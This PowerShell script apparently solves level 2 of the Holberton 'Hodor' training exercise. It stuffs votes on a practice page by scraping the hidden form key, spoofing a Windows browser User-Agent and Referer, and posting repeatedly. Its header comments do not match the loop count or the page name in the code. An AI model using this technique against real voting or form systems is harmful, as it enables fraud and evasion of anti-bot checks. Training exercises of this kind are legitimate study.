#=======================================
#= 2. Level 2 - Holberton Hodor Project
#========================================

# ---------------------------------------
# script that votes 4096 times for your id
# here: http://158.69.76.135/level1.php.
# Using WebRequest session (GET - POST)

#   hint: Only count windows users votes
#   for this, use User-Agent in headers.
#-----------------------------------------

$url = "http://158.69.76.135/level2.php";
$headers = @{
'User-Agent'='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
'referer'=$url;
'Content-Type'= 'application/x-www-form-urlencoded';
'ContentLength' = 512
}


for($i=1; $i -le 5; $i++){

    $progressPreference = 'silentlyContinue'
    $page = Invoke-WebRequest $url -Method Get -SessionVariable hodor;

    $parse = $page -split ' '
    $match_key = $parse -match 'value'
    $match_key = $match_key -split '='

    $body = @{'id'='3922';'holdthedoor'="holdthedoor";'key'=$match_key[1].replace("`"","")}

    $IRM = Invoke-WebRequest -Uri $url -Method 'Post' -Headers $headers -Body $body -WebSession $hodor
    -join("sending vote ", $i, ": ")|Write-Host -NoNewline
    write-host $IRM.StatusDescription -ForegroundColor Green
}

Write-Host "sucessfull voting" -ForegroundColor DarkGreen
